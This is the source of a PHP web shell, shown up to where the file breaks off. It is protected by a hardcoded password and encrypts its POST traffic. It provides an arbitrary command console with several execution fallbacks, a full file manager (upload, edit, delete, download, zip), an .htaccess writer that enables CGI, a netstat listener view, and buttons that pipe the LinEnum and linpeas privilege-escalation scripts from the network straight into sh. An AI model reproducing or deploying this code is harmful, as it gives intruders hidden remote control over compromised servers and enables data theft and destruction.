<?php
    session_start();
    
    $_password = 'P@ssw0rd!';
    
    // from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())
    $fernet_key = 'MeNuWBMrXyAfcWtqmy4iDg5Hh0fkWfvBveTfdsPqnLQ=';
    
    function fernet_encrypt($data) {
        global $fernet_key;
        $iv = random_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', base64_decode($fernet_key), 0, $iv);
        $combined = $iv . base64_decode($encrypted);
        return base64_encode($combined);
    }
    
    function fernet_decrypt($encrypted_data) {
        global $fernet_key;
        $combined = base64_decode($encrypted_data);
        $iv = substr($combined, 0, 16);
        $encrypted = substr($combined, 16);
        $decrypted = openssl_decrypt(base64_encode($encrypted), 'AES-256-CBC', base64_decode($fernet_key), 0, $iv);
        return $decrypted;
    }
    
    function decrypt_post_data() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            if (!empty($input)) {
                $decrypted = fernet_decrypt($input);
                if ($decrypted !== false) {
                    parse_str($decrypted, $_POST);
                }
            }
        }
    }
    
    // 在處理請求前解密數據
    decrypt_post_data();
    
    function isLoggedIn() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
    }
    
    function handleLogin() {
        global $_password;
        
        if (isset($_POST['password'])) {
            $password = $_POST['password'];
            
            if ($password === $_password) {
                $_SESSION['logged_in'] = true;
                $_SESSION['login_time'] = time();
                return true;
            } else {
                return false;
            }
        }
        return false;
    }
    
    function handleLogout() {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (isset($_GET['op']) && $_GET['op'] === 'logout') {
        handleLogout();
    }
    
    if (isset($_POST['login'])) {
        if (handleLogin()) {
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Invalid password';
        }
    }

    // 新增 API 路由處理
    if (isLoggedIn() && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $op = $_POST['op'] ?? '';
        
        switch ($op) {
            case 'upload':
                handleFileUpload();
                break;
            case 'console':
                handleConsole();
                break;
            case 'netscan':
                handleNetworkScan();
                break;
            case 'linenum':
                handleLinEnum();
                break;
            case 'linpeas':
                handleLinpeas();
                break;
            case 'searchfile':
                handleSearchFile();
                break;
            case 'searchcontent':
                handleSearchContent();
                break;
            case 'htaccess':
                handleHtaccess();
                break;
            case 'editfile':
                handleEditFile();
                break;
            case 'renamefile':
                handleRenameFile();
                break;
            case 'deletefile':
                handleDeleteFile();
                break;
            case 'viewfile':
                handleViewFile();
                break;
            case 'createfile':
                handleCreateFile();
                break;
            case 'createfolder':
                handleCreateFolder();
                break;
            case 'renamefolder':
                handleRenameFolder();
                break;
            case 'deletefolder':
                handleDeleteFolder();
                break;
            case 'zipfolder':
                handleZipFolder();
                break;
            case 'zipfile':
                handleZipFile();
                break;
            case 'downloadfile':
                handleDownloadFile();
                break;
            case 'downloadfolder':
                handleDownloadFolder();
                break;
            // 可以在此添加其他 API 操作
            default:
                if (!empty($op)) {
                    http_response_code(400);
                    echo json_encode(['error' => 'Invalid operation']);
                    exit;
                }
                break;
        }
    }

    function writable($dir, $permit) {
        if(!is_writable($dir)) {
            return "<rd>".$permit."</rd>";
        } else {
            return "<gr>".$permit."</gr>";
        }
    }

    function get_permit($file){
        $p = fileperms($file);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
        
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));

        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
        return $i;
    }

    function ON_and_OFF($bool){
        return $bool ? "<gr>ON</gr>" : "<rd>OFF</rd>";
    }

    function exe($cmd) {
        if (function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('exec')) {
            @exec($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return $buff;
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('proc_open')) {
            $pipes = array();
            $process = @proc_open($cmd . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $buff = @stream_get_contents($pipes[1]);
            @proc_close($process);
            return $buff;
        } elseif (function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return $buff;
        }
    }

    function msgbox(){
        echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
    }
    function ok_banner(){
        echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
    }
    function error_banner(){
        echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
    }

    function listFilesInDirectory($dir)
    {
        if (is_dir($dir)) {
            if ($dh = opendir($dir)) {
                echo "<div class='md-card mt-3'>";
                echo "<table class='md-table w-100'>";
                echo "<thead><tr>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>description</i>Filename</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>category</i>Type</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>schedule</i>Last Modified</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>storage</i>Size</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>person</i>Owner/Group</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>security</i>Permission</th>
                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>build</i>Action</th>
                </tr></thead><tbody>";
                // 加密父目錄路徑
                $parent_path = dirname(getcwd());
                $encrypted_parent = fernet_encrypt($parent_path);
                echo "<tr>
                    <td class='text-center'><a href='?0=" . urlencode($encrypted_parent) . "'>..</a></td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>
                        <button class='btn btn-sm btn-outline-primary' onclick='showCreateFile()'><i class='bi bi-file-earmark-plus-fill'></i></button>
                        <button class='btn btn-sm btn-outline-primary' onclick='showCreateFolder()'><i class='bi bi-folder-plus'></i></button>
                    </td>
                </tr>";
                while (($file = readdir($dh)) !== false) {
                    if ($file != '.' && $file != '..') {
                        $filepath = $dir . '/' . $file;
                        $filetype = filetype($filepath);
                        $lastEdit = date("Y-m-d H:i:s", filemtime($filepath));
                        $size = filesize($filepath);
                        $owner = posix_getpwuid(fileowner($filepath))['name'];
                        $group = posix_getgrgid(filegroup($filepath))['name'];
                        $permissions = writable($filepath, get_permit($filepath));
                        echo "<tr>
                            <td class='text-center'>";
                        if ($filetype == 'dir') {
                            $folder_path = $dir . '/' . $file;
                            $encrypted_folder_path = fernet_encrypt($folder_path);
                            echo "<a href='?0=" . urlencode($encrypted_folder_path) . "'>{$file}</a>";
                        } else {
                            echo "{$file}";
                        }
                        echo "</td>
                            <td class='text-center'>{$filetype}</td>
                            <td class='text-center'>{$lastEdit}</td>
                            <td class='text-center'>{$size}</td>
                            <td class='text-center'>{$owner}/{$group}</td>
                            <td class='text-center'>{$permissions}</td>
                            <td class='text-center'>";
                        if ($filetype == 'dir') {
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showRenameFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>edit</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showZipFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>archive</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='downloadFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>download</i></button> ";
                            echo "<button class='md-btn md-btn-danger' style='padding: 6px 12px; margin: 2px;' onclick='showDeleteFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>delete</i></button>";
                        } else {
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showViewFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>visibility</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showEditFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>edit</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showRenameFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>drive_file_rename_outline</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showZipFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>archive</i></button> ";
                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='downloadFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>download</i></button> ";
                            echo "<button class='md-btn md-btn-danger' style='padding: 6px 12px; margin: 2px;' onclick='showDeleteFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>delete</i></button>";
                        }
                        echo "</td></tr>";
                    }
                }
                echo "</tbody></table>";
                echo "</div>";
                closedir($dh);
            }
        } else {
            echo "<div class='md-card p-3'>";
            echo "<p class='text-center text-muted mb-0'>Invalid directory: {$dir}</p>";
            echo "</div>";
        }
    }

    function showUploadInterface($content=null) {
        echo "
        <div id='upload-container' class='upload-box' style='display: none;'>
            <div class='upload-content'>";
        if($content === null){
            echo "<form action='?' method='post' enctype='multipart/form-data'>
                    <h3>Upload File</h3>
                    <input type='file' name='fileToUpload' id='fileToUpload'>
                    <br><br>
                    <input type='submit' value='Upload File' name='submit' class='btn btn-primary'>
                    <button type='button' class='btn btn-secondary' onclick='hideUploadInterface();'>Cancel</button>
                </form>";
        }
        echo"
            </div>
        </div>
        ";
    }

    function handleConsole() {
        if(isset($_POST['cmd'])) {
            $encodedCmd = $_POST['cmd'];
            $cmd = base64_decode($encodedCmd);
            $output = exe($cmd);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="consoleContainer" class="dialog-container bg-dark text-light p-3 rounded">
                <div id="consoleOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="consoleForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="cmdInput" placeholder="Enter command">
                        <button class="btn btn-outline-light" type="button" onclick="executeCommand()">Execute</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleNetworkScan() {
        if(isset($_POST['execute'])) {
            // 檢查 netstat 是否存在
            $netstat_exists = exe('which netstat');
            if (empty($netstat_exists)) {
                echo json_encode(['output' => "netstat doesn't exist"]);
                return;
            }
            $command = "netstat -lp";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="networkScanContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="networkScanOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeNetworkScan()">Execute Network Scan</button>
                </div>
            </div>
            ';
        }
    }

    function handleLinEnum() {
        if(isset($_POST['execute'])) {
            // 檢查 curl 是否存在
            $curl_exists = exe('which curl');
            if (empty($curl_exists)) {
                echo json_encode(['output' => "curl doesn't exist"]);
                return;
            }

            // 如果 curl 存在,執行 LinEnum
            $command = "curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh | sh";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="linEnumContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="linEnumOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinEnum()">Execute LinEnum</button>
                </div>
            </div>
            ';
        }
    }

    function handleLinpeas() {
        if(isset($_POST['execute'])) {
            // 檢查 curl 是否存在
            $curl_exists = exe('which curl');
            if (empty($curl_exists)) {
                echo json_encode(['output' => "curl doesn't exist"]);
                return;
            }

            // 如果 curl 存在,執行 Linpeas
            $command = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="linpeasContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="linpeasOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinpeas()">Execute Linpeas</button>
                </div>
            </div>
            ';
        }
    }

    function handleSearchFile() {
        if(isset($_POST['filename'])) {
            $filename = $_POST['filename'];
            $path = isset($_POST['path']) ? $_POST['path'] : '.';
            $command = "find '$path' -name '*$filename*'";
            $output = exe($command);
            echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
        } else {
            echo '
            <div id="searchFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="searchFileOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="searchFileForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="filenameInput" placeholder="Enter filename" style="width: calc(100% - 100px);">
                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchFile()">Search</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleSearchContent() {
        if(isset($_POST['content'])) {
            $content = $_POST['content'];
            $path = isset($_POST['path']) ? $_POST['path'] : '.';
            $command = "grep -r '$content' '$path'";
            $output = exe($command);
            echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
        } else {
            echo '
            <div id="searchContentContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="searchContentOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="searchContentForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="contentInput" placeholder="Enter search content" style="width: calc(100% - 100px);">
                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchContent()">Search</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleHtaccess() {
        $path = isset($_POST['path']) ? $_POST['path'] : getcwd();
        
        if(isset($_POST['content'])) {
            $content = $_POST['content'];
            $htaccessPath = $path . '/.htaccess';
            
            if (file_put_contents($htaccessPath, $content) !== false) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to create .htaccess file']);
            }
        } else {
            // 預設的.htaccess範本
            $defaultContent = "Options +ExecCGI +Includes +FollowSymLinks\n";
            $defaultContent .= "AddType application/x-httpd-cgi .cgi\n";
            $defaultContent .= "AddHandler cgi-script .cgi\n\n";
            $defaultContent .= "<FilesMatch \".+\.ph(p[3457]?|t|tml)$\">\n";
            $defaultContent .= "    Order Allow,Deny\n";
            $defaultContent .= "    Allow from all\n";
            $defaultContent .= "</FilesMatch>\n\n";
            $defaultContent .= "<IfModule mod_rewrite.c>\n";
            $defaultContent .= "    RewriteEngine On\n";
            $defaultContent .= "    RewriteCond %{REQUEST_FILENAME} !-f\n";
            $defaultContent .= "    RewriteCond %{REQUEST_FILENAME} !-d\n";
            $defaultContent .= "    RewriteRule ^(.*)$ index.php/$1 [L]\n";
            $defaultContent .= "</IfModule>";
            
            echo '
            <div id="htaccessContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div class="mb-3">
                    <textarea id="htaccessContent" class="form-control bg-secondary text-light" 
                        style="height: 300px; resize: none;" 
                        placeholder="Enter .htaccess content...">' . htmlspecialchars($defaultContent) . '</textarea>
                </div>
                <div class="d-flex justify-content-center">
                    <button class="btn btn-outline-light" 
                        style="min-width: 120px; padding: 8px 20px;" 
                        type="button" 
                        onclick="generateHtaccess()">Generate</button>
                </div>
            </div>
            ';
        }
    }

    function handleEditFile() {
        if(isset($_POST['filename']) && isset($_POST['content'])) {
            $filename = $_POST['filename'];
            $content = $_POST['content'];
            
            if (file_put_contents($filename, $content) !== false) {
                echo json_encode(['success' => true, 'message' => 'File edited successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to edit file']);
            }
        } else {
            $filename = $_POST['filename'] ?? '';
            if (file_exists($filename) && is_readable($filename)) {
                $content = file_get_contents($filename);
                echo '
                <div id="editFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Edit File: ' . htmlspecialchars(basename($filename)) . '</h5>
                        <textarea id="editFileContent" class="form-control bg-secondary text-light" 
                            style="height: 400px; resize: none;" 
                            placeholder="File content...">' . htmlspecialchars($content) . '</textarea>
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-primary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="saveFileEdit(\'' . htmlspecialchars($filename) . '\')">Save</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'File does not exist or cannot be read']);
            }
        }
    }

    function handleRenameFile() {
        if(isset($_POST['oldname']) && isset($_POST['newname'])) {
            $oldname = $_POST['oldname'];
            $newname = $_POST['newname'];
            
            if (file_exists($oldname)) {
                // 確保新文件名包含正確的路徑
                $dirname = dirname($oldname);
                $newpath = $dirname . '/' . basename($newname);
                
                if (rename($oldname, $newpath)) {
                                    echo json_encode(['success' => true, 'message' => 'File renamed successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to rename file']);
                }
            } else {
                echo json_encode(['success' => false, 'error' => 'Original file does not exist']);
            }
        } else {
            $filename = $_POST['filename'] ?? '';
            if (file_exists($filename)) {
                echo '
                <div id="renameFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Rename File</h5>
                        <p>Original filename: ' . htmlspecialchars(basename($filename)) . '</p>
                        <input type="text" id="newFileName" class="form-control bg-secondary text-light" 
                            value="' . htmlspecialchars(basename($filename)) . '" 
                            placeholder="New filename">
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-primary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="saveFileRename(\'' . htmlspecialchars($filename) . '\')">Rename</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'File does not exist']);
            }
        }
    }

    function handleDeleteFile() {
        if(isset($_POST['filename']) && isset($_POST['confirm'])) {
            $filename = $_POST['filename'];
            
            if (file_exists($filename)) {
                if (unlink($filename)) {
                                    echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to delete file']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'File does not exist']);
            }
        } else {
            $filename = $_POST['filename'] ?? '';
            if (file_exists($filename)) {
                echo '
                <div id="deleteFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Confirm Delete</h5>
                        <p>Are you sure you want to delete file: <strong>' . htmlspecialchars(basename($filename)) . '</strong>?</p>
                        <p class="text-warning">This action cannot be undone!</p>
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-danger" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="confirmDeleteFile(\'' . htmlspecialchars($filename) . '\')">Confirm Delete</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'File does not exist']);
            }
        }
    }

    function handleViewFile() {
        $filename = $_POST['filename'] ?? '';
        if (file_exists($filename) && is_readable($filename)) {
            $content = file_get_contents($filename);
            echo '
            <div id="viewFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div class="mb-3">
                                            <h5>View File: ' . htmlspecialchars(basename($filename)) . '</h5>
                        <textarea id="viewFileContent" class="form-control bg-secondary text-light" 
                            style="height: 400px; resize: none;" 
                            readonly placeholder="File content...">' . htmlspecialchars($content) . '</textarea>
                </div>
                <div class="d-flex justify-content-center gap-2">
                    <button class="btn btn-outline-secondary" 
                        style="min-width: 100px; padding: 8px 20px;" 
                        type="button" 
                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Close</button>
                </div>
            </div>
            ';
        } else {
            echo json_encode(['success' => false, 'error' => 'File does not exist or cannot be read']);
        }
    }

    function handleCreateFile() {
        if(isset($_POST['filename']) && isset($_POST['content'])) {
            $filename = $_POST['filename'];
            $content = $_POST['content'];
            
            if (file_put_contents($filename, $content) !== false) {
                echo json_encode(['success' => true, 'message' => 'File created successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to create file']);
            }
        } else {
            echo '
            <div id="createFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div class="mb-3">
                    <h5>Create New File</h5>
                    <input type="text" id="newFileName" class="form-control bg-secondary text-light mb-3" 
                        placeholder="Filename">
                    <textarea id="newFileContent" class="form-control bg-secondary text-light" 
                        style="height: 300px; resize: none;" 
                        placeholder="File content..."></textarea>
                </div>
                <div class="d-flex justify-content-center gap-2">
                    <button class="btn btn-outline-secondary" 
                        style="min-width: 100px; padding: 8px 20px;" 
                        type="button" 
                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                    <button class="btn btn-outline-primary" 
                        style="min-width: 100px; padding: 8px 20px;" 
                        type="button" 
                        onclick="createNewFile()">Create</button>
                </div>
            </div>
            ';
        }
    }

    function handleCreateFolder() {
        if(isset($_POST['foldername'])) {
            $foldername = $_POST['foldername'];
            
            if (mkdir($foldername, 0755, true)) {
                echo json_encode(['success' => true, 'message' => 'Folder created successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to create folder']);
            }
        } else {
            echo '
            <div id="createFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div class="mb-3">
                    <h5>Create New Folder</h5>
                    <input type="text" id="newFolderName" class="form-control bg-secondary text-light" 
                        placeholder="Folder name">
                </div>
                <div class="d-flex justify-content-center gap-2">
                    <button class="btn btn-outline-secondary" 
                        style="min-width: 100px; padding: 8px 20px;" 
                        type="button" 
                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                    <button class="btn btn-outline-primary" 
                        style="min-width: 100px; padding: 8px 20px;" 
                        type="button" 
                        onclick="createNewFolder()">Create</button>
                </div>
            </div>
            ';
        }
    }

    function handleRenameFolder() {
        if(isset($_POST['oldname']) && isset($_POST['newname'])) {
            $oldname = $_POST['oldname'];
            $newname = $_POST['newname'];
            
            if (is_dir($oldname)) {
                // 確保新資料夾名包含正確的路徑
                $dirname = dirname($oldname);
                $newpath = $dirname . '/' . basename($newname);
                
                if (rename($oldname, $newpath)) {
                                    echo json_encode(['success' => true, 'message' => 'Folder renamed successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to rename folder']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Original folder does not exist']);
            }
        } else {
            $foldername = $_POST['foldername'] ?? '';
            if (is_dir($foldername)) {
                echo '
                <div id="renameFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Rename Folder</h5>
                        <p>Original folder name: ' . htmlspecialchars(basename($foldername)) . '</p>
                        <input type="text" id="newFolderName" class="form-control bg-secondary text-light" 
                            value="' . htmlspecialchars(basename($foldername)) . '" 
                            placeholder="New folder name">
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-primary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="saveFolderRename(\'' . htmlspecialchars($foldername) . '\')">Rename</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
            }
        }
    }

    function handleDeleteFolder() {
        if(isset($_POST['foldername']) && isset($_POST['confirm'])) {
            $foldername = $_POST['foldername'];
            
            if (is_dir($foldername)) {
                // 遞歸刪除資料夾
                function deleteDirectory($dir) {
                    if (!is_dir($dir)) {
                        return false;
                    }
                    
                    $files = array_diff(scandir($dir), array('.', '..'));
                    foreach ($files as $file) {
                        $path = $dir . DIRECTORY_SEPARATOR . $file;
                        if (is_dir($path)) {
                            deleteDirectory($path);
                        } else {
                            unlink($path);
                        }
                    }
                    return rmdir($dir);
                }
                
                if (deleteDirectory($foldername)) {
                                    echo json_encode(['success' => true, 'message' => 'Folder deleted successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unable to delete folder']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
            }
        } else {
            $foldername = $_POST['foldername'] ?? '';
            if (is_dir($foldername)) {
                echo '
                <div id="deleteFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Confirm Delete Folder</h5>
                        <p>Are you sure you want to delete folder: <strong>' . htmlspecialchars(basename($foldername)) . '</strong>?</p>
                        <p class="text-warning">This action will delete all files in the folder and cannot be undone!</p>
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-danger" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="confirmDeleteFolder(\'' . htmlspecialchars($foldername) . '\')">Confirm Delete</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
            }
        }
    }

    function handleZipFolder() {
        if(isset($_POST['foldername']) && isset($_POST['confirm'])) {
            $foldername = $_POST['foldername'];
            $zipname = $_POST['zipname'] ?? basename($foldername) . '.zip';
            
            if (is_dir($foldername)) {
                $zipPath = dirname($foldername) . '/' . $zipname;
                
                // 使用 bash zip 命令
                $command = "zip -r '" . $zipPath . "' '" . $foldername . "'";
                $output = exe($command);
                
                if (file_exists($zipPath)) {
                    echo json_encode(['success' => true, 'message' => 'Folder compressed successfully', 'zipfile' => $zipname]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'Compressed file creation failed: ' . $output]);
                }
            } else {
                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
            }
        } else {
            $foldername = $_POST['foldername'] ?? '';
            if (is_dir($foldername)) {
                $defaultZipName = basename($foldername) . '.zip';
                echo '
                <div id="zipFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Folder Compression</h5>
                        <p>Folder: <strong>' . htmlspecialchars(basename($foldername)) . '</strong></p>
                        <input type="text" id="zipFileName" class="form-control bg-secondary text-light mb-3" 
                            value="' . htmlspecialchars($defaultZipName) . '" 
                            placeholder="ZIP File Name">
                        <p class="text-info">This operation will create a ZIP archive containing all files inside the folder.</p>
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
